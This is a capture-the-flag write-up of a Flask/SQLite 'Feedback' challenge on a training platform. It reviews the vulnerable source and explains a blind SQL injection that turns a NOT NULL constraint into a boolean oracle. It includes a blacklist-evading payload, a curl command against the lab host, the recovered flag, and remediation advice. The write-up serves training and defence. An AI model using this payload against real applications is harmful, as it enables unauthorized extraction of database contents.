# Feedback — Web (Easy)

**Author:** Obito Uchiha — Team AKATSUKI **Platform:** FlagYard — Black Hat Training Labs **Category:** Web **Difficulty:** Easy **Target:** `http://t2jpdg8uvwnoawhh.playat.flagyard.com/login`

---

## Challenge Description

A note-taking app's sibling — same Flask + SQLite codebase as _Nooter_, but with `notes` renamed to `feedback`. Full application source (`app.py`) was provided.

---

## Source Review

The vulnerable insert is functionally identical to the earlier _Nooter_ challenge:

```python
if request.method == 'POST' and 'feedback' in request.form:
    feedback = request.form['feedback']
    if blacklist(feedback):
        msg = 'Forbidden word detected'
    else:
        query = db.insert("INSERT INTO feedback(username, feedback) VALUES(?,'%s')" % feedback, session['username'])
        if query is not True:
            msg = 'Something went wrong'
            return render_template('home.html', username=session['username'], msg=msg)
        feedback = "Thanks for the feedback"
```

Same keyword blacklist as before (missing `select`, `from`, and SQLite's `||` operator), so the same string-breakout technique from _Nooter_ applies here too.

**Key difference from Nooter:** this version's `index()` route does **not** re-query and display all stored feedback rows. On success it simply overwrites the local `feedback` variable with the static string `"Thanks for the feedback"`, and on failure it shows `"Something went wrong"`. There is no endpoint that lists past feedback. This turns the bug from a straightforward **in-band** SQLi (where the injected result is reflected directly, as in Nooter) into a **blind** SQLi — the payload can still manipulate the query, but the result of any `SELECT` can only be inferred from the app's True/False-style response, not read directly.

---

## Vulnerability

**Blind SQL Injection (CWE-89)** via unsanitized string interpolation into a raw SQL `INSERT` statement, exploited using a **NOT NULL constraint** as a boolean oracle.

---

## Building the Oracle

The `feedback` table is defined as:

```sql
CREATE TABLE IF NOT EXISTS feedback(
    username text NOT NULL,
    feedback text NOT NULL
);
```

The `feedback` column is `NOT NULL`. If the injected subquery evaluates to `NULL`, the `INSERT` will violate this constraint, `db.insert()`'s `try/except` will catch the resulting `IntegrityError`, and the route returns **"Something went wrong."** If the subquery evaluates to a non-null string instead, the insert succeeds and the route returns **"Thanks for the feedback."**

This gives a clean boolean oracle:

```sql
(select case when (<condition>) then 'a' else NULL end from flag)
```

- `<condition>` is **true** → `'a'` is returned → insert succeeds → `"Thanks for the feedback"`
- `<condition>` is **false** → `NULL` is returned → constraint violated → `"Something went wrong"`

None of `select`, `case`, `when`, `then`, `else`, `end`, `from`, `unicode`, `substr`, or `null` trip the blacklist (`exec`, `load`, `blob`, `glob`, `union`, `join`, `like`, `match`, `regexp`, `in`, `limit`, `order`, `hex`, `where`) — and critically, none of them contain `in` as a substring either.

---

## Extraction Strategy — Binary Search per Character

For each character position in the flag, a binary search over the printable ASCII range (32–126) pins down the exact character in ~7 requests using:

```sql
unicode(substr(flag,POS,1)) > VAL
```

`unicode()` returns the character code at a given position; comparing it against a midpoint value and branching on the oracle's True/False response narrows the range exponentially, just like a "guess the number" game.

### Full breakout payload (single query)

```sql
' || (select case when (unicode(substr(flag,POS,1)) > VAL) then 'a' else NULL end from flag) || ''
```

Substituted into the app's template `'%s'`, the final query becomes:

```sql
INSERT INTO feedback(username, feedback) VALUES(?, '' || (select case when (unicode(substr(flag,POS,1)) > VAL) then 'a' else NULL end from flag) || '')
```

### Manual example — probing the first character

```bash
curl -s -b cookies.txt -c cookies.txt -X POST http://t2jpdg8uvwnoawhh.playat.flagyard.com/ \
  --data-urlencode "feedback=' || (select case when (unicode(substr(flag,1,1)) > 70) then 'a' else NULL end from flag) || '" \
  | grep -E "Thanks|wrong"
```

A `"Thanks"` response confirms the first character's code is greater than 70; a `"Something went wrong"` response confirms it's 70 or less. Repeating this with narrower bounds converges on the exact character (`'F'`, code 70), then the process repeats for each subsequent position until a closing `}` is found.

---

## Flag

```
FlagY{78909649470553629b1438ebc5e435b8}
```

---

## Root Cause

- Same root cause as _Nooter_: user-controlled input concatenated into a raw SQL statement via `%` string formatting instead of a parameterized placeholder, filtered only by an incomplete keyword blacklist.
- The **absence of any endpoint that reflects query results** turned an otherwise directly-exploitable SQLi into a blind one — but did not fix the underlying flaw. A `NOT NULL` schema constraint was sufficient to build a full boolean oracle and exfiltrate arbitrary data one bit of information at a time.

## Remediation

- Use parameterized queries for all user-controlled values — no string formatting into SQL text, ever:
    
    ```python
    db.insert("INSERT INTO feedback(username, feedback) VALUES(?, ?)", session['username'], feedback)
    ```
    
- Do not rely on keyword blacklists as a security boundary; they are trivially incomplete.
- Reducing application feedback (no reflected query results) raises the bar for exploitation but does not eliminate the vulnerability — a determined attacker can still extract data via timing, boolean, or constraint-based oracles. The only real fix is preventing the injection in the first place.

---

_Obito Uchiha — Team AKATSUKI_